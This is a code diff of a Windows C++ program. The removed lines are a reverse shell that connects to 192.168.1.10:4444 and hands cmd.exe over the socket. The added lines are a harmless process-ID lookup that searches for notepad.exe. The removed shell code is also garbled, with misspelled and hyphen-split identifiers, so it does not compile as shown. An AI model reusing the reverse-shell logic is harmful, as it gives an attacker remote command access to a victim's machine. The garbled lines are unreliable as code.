@@ -1,42 +1,38 @@
-#include <fstream>
-
+#include <windows.h>
+#include <tlhelp32.h>
 #include <iostream>
+#include <string>
 
-int main(){
+// Função para encontrar o PID de um processo pelo nome
+DWORD findProcessID(const std::wstring& processName) {
+    PROCESSENTRY32W pe32 = { sizeof(PROCESSENTRY32W) };
+    // O nome correto da função é com 'h' minúsculo
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    
+    if (snapshot == INVALID_HANDLE_VALUE) return 0;
 
-WSADATA wsaData;
+    if (Process32FirstW(snapshot, &pe32)) {
+        do {
+            if (processName == pe32.szExeFile) {
+                CloseHandle(snapshot);
+                return pe32.th32ProcessID;
+            }
+        } while (Process32NextW(snapshot, &pe32));
+    }
 
-SOCKET sock;
+    CloseHandle(snapshot);
+    return 0;
+}
 
-sockaddr_in target;
+int main() {
+    // Exemplo de uso: procurando o bloco de notas
+    DWORD pid = findProcessID(L"notepad.exe");
 
-WSAStartup(MAKEWORD(2,2),&wsaData);
+    if (pid != 0) {
+        std::wcout << L"Processo encontrado! PID: " << pid << std::endl;
+    } else {
+        std::wcout << L"Processo nao encontrado." << std::endl;
+    }
 
-sock = WSA_SOCKET(AF_INET, SOCK_STREAM, IP-PROTO_TCP,nullptr,0,0);
-
-target.sin_family = AF_INET;
-
-target.sin_port = htons(4444);
-
-target.sin_addr.s_addr = inet_addr("192.168.1.10");
-
-connect(sock,(sockaddr*)&target,sizeof(target));
-
-STARTUPINFOA si = { sizeof(si)};
-
-PROCESS_INFORMATION
-pi;
-
-si.dwFlags = STARTF_US-
-ESTDHANDLES;
-
-si.hStdInput =
-si.hStdOutput =
-si.hStdError = (HANDLE)sock;
-
-CreateProcessA(nullptr,(LPSTR)"cmd.exe",nullptr,
-nullptr,&si,&pi);
-
-return 0;
-
+    return 0;
 }
